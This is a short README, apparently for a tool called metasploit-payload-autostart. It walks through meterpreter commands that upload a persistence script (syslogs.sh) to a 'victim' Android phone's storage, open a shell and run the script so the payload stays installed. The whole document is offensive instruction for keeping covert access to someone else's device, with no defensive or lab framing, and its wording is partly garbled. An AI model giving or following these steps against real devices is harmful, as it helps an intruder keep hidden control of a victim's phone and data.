# metasploit-payload-autostart

UPLOADING PERSISTENT SCRIPT AND EXECUTING) 

Now when you get meterpreter session of your victim device to follow the below steps to upload persistent script and to make payload persistent on the victim device.

Ex :-

meterpreter> upload /sdcard/syslogs.sh  /sdcard

(Nowhere the persistent script will be uploaded to your victim's device internal storage)

meterpreter> cd /sdcard

meterpreter> ls

meterpreter> shell

meterpreter> ls

(Nowhere your victim's internal storage will be shown so here check if Syslogs.sh file is present or not if not then repeat the step1. if it is present then you can follow below step)

meterpreter> sh syslogs.sh

(Nowhere the process of persistent activity takes 10 Minutes after ten minutes you can exit from the process)
